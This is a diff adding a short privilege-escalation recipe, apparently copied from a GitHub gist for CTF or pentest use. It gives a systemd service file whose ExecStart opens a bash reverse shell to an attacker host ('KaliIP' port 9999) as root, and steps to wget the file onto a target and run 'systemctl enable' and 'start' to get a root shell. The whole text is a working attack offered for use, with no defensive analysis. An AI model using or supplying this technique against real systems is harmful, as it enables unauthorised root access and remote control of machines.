@@ -1,0 +1,29 @@
+https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+
+1.) create a service file naming it whatever you want (something like root.service or pbot.service)
+2.) copy and paste the following into the file:
+
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+3.) make sure to change your ip and port you want to listen to in this script
+4.) save the file
+5.) start a python server and wget it onto the target machine. tmp directory if you are a low priv user like www-data
+6.) once the file is on the target machine start a listener on your machine on the port you entered into root.service
+7.) back on the target machine enter:
+
+/bin/systemctl enable /tmp/root.service (the path is only relevant if you uploaded root.service in the tmp directory)
+	- you should get a response like this: Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/tmp/root.service
+8.) get yourself a root shell by entering:
+
+/bin/systemctl start root
+
+9.) you should now have a root shell on your listener!!!!
